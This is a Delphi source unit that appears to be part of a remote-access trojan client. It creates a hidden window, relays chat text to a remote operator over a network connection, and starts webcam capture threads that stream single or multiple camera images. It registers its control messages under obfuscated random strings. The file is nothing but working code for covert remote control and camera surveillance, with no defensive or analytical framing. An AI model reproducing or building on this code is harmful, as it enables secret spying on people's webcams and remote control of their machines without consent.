unit UnitClientHandle;

interface

uses
  Windows, uCamHelper, UnitVariables, UnitFunctions, UnitTransfersManager, Messages,
  UnitCommands, SysUtils;

procedure CreateClientHandle;

implementation

var
  hButton, hEdit, hMemo,
  bFont, eFont: THandle;

function GetMemoText: string;
var
  Len: Integer;
  TmpChar: PChar;
begin       
  Result := '';
  Len := SendMessage(hMemo, WM_GETTEXTLENGTH, 0, 0);
  if Len = 0 then Exit;
  Len := Len + 1;
  GetMem(TmpChar, Len);
  FillChar(TmpChar^, Len, 0);
  Len := SendMessage(hMemo, WM_GETTEXT, Len, Integer(TmpChar));
  SetString(Result, TmpChar, Len);
  FreeMem(TmpChar);
end;

function GetEditText: string;
var
  Len: Integer;
  TmpChar: PChar;
begin
  Result := '';
  Len := SendMessage(hEdit, WM_GETTEXTLENGTH, 0, 0);
  if Len = 0 then Exit;
  Len := Len + 1;
  GetMem(TmpChar, Len);
  FillChar(TmpChar^, Len, 0);
  Len := SendMessage(hEdit, WM_GETTEXT, Len, Integer(TmpChar));
  SetString(Result, TmpChar, Len);
  FreeMem(TmpChar);
end;

function WindowProc(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  TmpStr, ToSend: string;
  i: Integer;
begin
  if Msg = WM_CREATE then
  begin
    eFont := CreateFont(-12,0,0,0,0,0,0,0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
      DEFAULT_QUALITY, VARIABLE_PITCH or FF_SWISS, 'Courier New');

    bFont := CreateFont(-12,0,0,0,0,0,0,0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
      DEFAULT_QUALITY, VARIABLE_PITCH or FF_SWISS, 'Tahoma');

    hMemo := CreateWindow('EDIT', '', WS_CHILD or WS_VISIBLE or WS_VSCROLL or
      ES_MULTILINE or ES_WANTRETURN, CW_USEDEFAULT, CW_USEDEFAULT, 590,
      300, hWnd, 0, GetModuleHandle(nil), nil);
    SendMessage(hMemo, EM_SETREADONLY, Integer(True), 0);
    SendMessage(hMemo, WM_SETFONT, eFont, 0);

    hEdit := CreateWindow('EDIT', '', WS_CHILD or WS_VISIBLE, 10, 310,
      480, 21, hWnd, 0, GetModuleHandle(nil), nil);
    SendMessage(hEdit, WM_SETFONT, eFont, 0);

    hButton := CreateWindow('BUTTON', 'Send', WS_CHILD or WS_VISIBLE or
      BS_PUSHBUTTON or BS_TEXT, 510, 308, 75, 25, hWnd, 0, GetModuleHandle(nil), nil);
    SendMessage(hButton, WM_SETFONT, bFont, 0);
  end
  else

  if Msg = WM_COMMAND then
  begin
    if lParam = hButton then
    begin
      ToSend := GetEditText;
      if ToSend = '' then Exit;
      TmpStr := '[' + TimeToStr(Time) + '] You: ' + ToSend;
      TmpStr := GetMemoText + TmpStr + #13#10;
      SendMessage(hMemo, WM_SETTEXT, 0, Integer(PChar(TmpStr)));
      i := Length(GetMemoText);
      SendMessage(hMemo, EM_SETSEL, i, i);
      SendMessage(hMemo, EM_SCROLLCARET, 0, 0);
      SendMessage(hEdit, WM_SETTEXT, 0, 0);
                    
      MainConnection.SendDatas(CHAT + '|' + CHATTEXT + '|' + ToSend);
    end;
  end
  else

  if Msg = WM_CLOSE then Exit else
  
  if Msg = WM_DESTROY then
  begin
    DestroyWindow(hButton);
    DestroyWindow(hMemo);
    DestroyWindow(hEdit);
    DeleteObject(eFont);
    DeleteObject(bFont);
    DestroyWindow(ClientHandle);
    PostQuitMessage(0);
  end
  else

  if Msg = WM_CHATWRITETEXT then
  begin
    i := Integer(wParam);
    SetLength(TmpStr, i);
    CopyMemory(@TmpStr[1], Pointer(lParam), i);
    TmpStr := '[' + TimeToStr(Time) + '] ' + NickName + ': ' + TmpStr;
    TmpStr := GetMemoText + TmpStr + #13#10;
    SendMessage(hMemo, WM_SETTEXT, 0, Integer(PChar(TmpStr)));
    i := Length(GetMemoText);
    SendMessage(hMemo, EM_SETSEL, i, i);
    SendMessage(hMemo, EM_SCROLLCARET, 0, 0);
  end
  else

  if Msg = WM_WEBCAMCAPTURESTART then
  begin
    CamHelper.StartCam(WebcamId + 1);
    TransferInfos.X := WebcamX;
    TransferInfos.Y := WebcamY;
    WebcamImage := True;
    MyStartThread(@SendWebcamImage, @TransferInfos);
  end
  else

  if Msg = WM_MULTIWEBCAMSTART then
  begin
    CamHelper.StartCam(1);
    WebcamMulti := True;
    MyStartThread(@SendWebcamMultiThumb);
  end
  else

  Result := DefWindowProc(HWND, Msg, wParam, lParam);
end;

procedure CreateClientHandle;
var
  wClass: TWndClass;
begin
  wClass.style := 0;
  wClass.lpfnWndProc := @WindowProc;
  wClass.cbClsExtra := 0;
  wClass.cbWndExtra := 0;
  wClass.hInstance := HInstance;
  wClass.hIcon := 0;
  wClass.hCursor := 0;
  wClass.hbrBackground := COLOR_BTNFACE + 1;
  wClass.lpszMenuName := nil;
  wClass.lpszClassName := 'PRClt';

  RegisterClass(wClass);
  ClientHandle := CreateWindowEx(WS_EX_DLGMODALFRAME or WS_EX_WINDOWEDGE,
    wClass.lpszClassName, '', WS_VISIBLE, 250, 50, 610, 380, 0, 0, HInstance, nil);

  ShowWindow(ClientHandle, 0);
  UpdateWindow(ClientHandle);
end;

initialization
  WM_CHATWRITETEXT := RegisterWindowMessage('hcccppcplbkgkrgaasweqrers');
  WM_WEBCAMCAPTURESTART := RegisterWindowMessage('jkdkfkjvrfgrevkjbkgkrgegrers');
  WM_MULTIWEBCAMSTART := RegisterWindowMessage('peswsdewwfvrfgrevrgvbcglorerqa');

end.
